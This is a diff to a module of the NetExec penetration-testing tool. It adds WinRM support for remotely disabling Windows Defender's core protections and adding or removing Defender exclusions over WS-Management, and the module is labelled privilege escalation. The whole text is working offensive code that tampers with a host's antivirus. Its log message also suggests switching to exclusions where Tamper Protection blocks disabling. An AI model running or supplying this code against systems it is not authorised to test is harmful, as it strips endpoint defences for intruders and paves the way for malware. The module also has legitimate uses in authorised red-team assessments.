@@ -22,7 +22,7 @@ class NXCModule:
 
     name = "defender"
     description = "Manage Windows Defender via MSFT_MpPreference: check status, disable/enable protection, add/remove exclusions"
-    supported_protocols = ["smb", "wmi"]
+    supported_protocols = ["smb", "wmi", "winrm"]
     category = CATEGORY.PRIVILEGE_ESCALATION
 
     NAMESPACE = "//./root/Microsoft/Windows/Defender"
@@ -109,6 +109,10 @@ class NXCModule:
             exit(1)
 
     def on_admin_login(self, context, connection):
+        if context.protocol == "winrm":
+            DefenderWinRM(context, connection, self).run()
+            return
+
         if context.protocol == "wmi":
             # The wmi protocol holds an authenticated IWbemLevel1Login after check_if_admin
             self.run(context, connection.iWbemLevel1Login)
@@ -264,3 +268,117 @@ class NXCModule:
         verb = "added" if add else "removed"
         if self.invoke_class_method(context, iWbemServices, method, kwargs):
             context.log.success(f"Exclusion {verb} successfully")
+
+
+class DefenderWinRM:
+    """Windows Defender management natively over WS-Management.
+
+    Queries and method calls go through the winrm protocol's
+    wql_enumerate / wmi_invoke: no PowerShell runspace, no DCOM.
+    """
+
+    NAMESPACE = "root\\Microsoft\\Windows\\Defender"
+
+    def __init__(self, context, connection, module):
+        self.context = context
+        self.connection = connection
+        self.logger = context.log
+        self.module = module
+
+    def run(self):
+        action = self.module.action
+        if action == "check":
+            self.check()
+        elif action in ("disable", "enable"):
+            self.set_core_protection(action == "enable")
+        else:
+            self.toggle_exclusion(action == "exclude")
+
+    def get_preferences(self):
+        records = self.connection.wql_enumerate(
+            "SELECT * FROM MSFT_MpPreference",
+            self.NAMESPACE,
+        )
+        return records[0] if records else {}
+
+    def check(self):
+        try:
+            props = self.get_preferences()
+        except Exception as e:
+            self.logger.fail(f"Failed to query MSFT_MpPreference: {e}")
+            return
+
+        self.module.print_protection(self.context, self._to_dcom_format(props))
+
+        self.logger.display("Exclusions:")
+        found = False
+        for field, label in self.module.EXCLUSION_FIELDS:
+            values = props.get(field)
+            if not values:
+                continue
+            if not isinstance(values, list):
+                values = [values]
+            found = True
+            for value in values:
+                self.logger.highlight(f"  [{label}] {value}")
+        if not found:
+            self.logger.highlight("  (none)")
+
+    def _to_dcom_format(self, props):
+        """Adapt the flat wql_enumerate record to the {field: {value: v}}
+        shape the shared formatting helpers consume.
+        """
+        return {k: {"value": v} for k, v in props.items()}
+
+    def invoke_method(self, method, params):
+        try:
+            result = self.connection.wmi_invoke(
+                self.NAMESPACE,
+                "MSFT_MpPreference",
+                method,
+                params,
+            )
+            return str(result.get("ReturnValue")) == "0"
+        except Exception as e:
+            self.logger.fail(f"Failed to call MSFT_MpPreference.{method}: {e}")
+            return False
+
+    def set_core_protection(self, enable):
+        action_str = "Enabling" if enable else "Disabling"
+        self.logger.display(f"{action_str} core protection features...")
+
+        overrides = dict.fromkeys(self.module.PROTECTION_FIELDS, not enable)
+        overrides.update(self.module.CLOUD_FIELDS_ENABLE if enable else self.module.CLOUD_FIELDS_DISABLE)
+
+        if self.invoke_method("Set", overrides):
+            self.logger.success(f"Core protection features {'enabled' if enable else 'disabled'}")
+
+        self.logger.display("Verifying...")
+        self.logger.display("Note: on some systems (e.g. Windows 11 as local admin) disable/enable is blocked by Defender Tamper Protection, while exclusions still work - prefer ACTION=exclude there")
+        try:
+            props = self.get_preferences()
+            self.module.print_protection(self.context, self._to_dcom_format(props))
+            stale = [field for field in self.module.PROTECTION_FIELDS if isinstance(value := self.module.prop_value({k: {"value": v} for k, v in props.items()}, field), bool) and value != (not enable)]
+            if stale:
+                self.logger.fail(f"{len(stale)} of {len(self.module.PROTECTION_FIELDS)} protection settings did not change (first: {stale[0]})")
+        except Exception as e:
+            self.logger.debug(f"Could not verify settings: {e}")
+
+    def toggle_exclusion(self, add):
+        params = {}
+        if self.module.path:
+            params["ExclusionPath"] = [self.module.path]
+        if self.module.process:
+            params["ExclusionProcess"] = [self.module.process]
+        if self.module.extension:
+            params["ExclusionExtension"] = [self.module.extension]
+
+        verb = "Adding" if add else "Removing"
+        for label, value in (("path", self.module.path), ("process", self.module.process), ("extension", self.module.extension)):
+            if value:
+                self.logger.display(f"{verb} exclusion {label}: {value}")
+
+        method = "Add" if add else "Remove"
+        verb_past = "added" if add else "removed"
+        if self.invoke_method(method, params):
+            self.logger.success(f"Exclusion {verb_past} successfully")
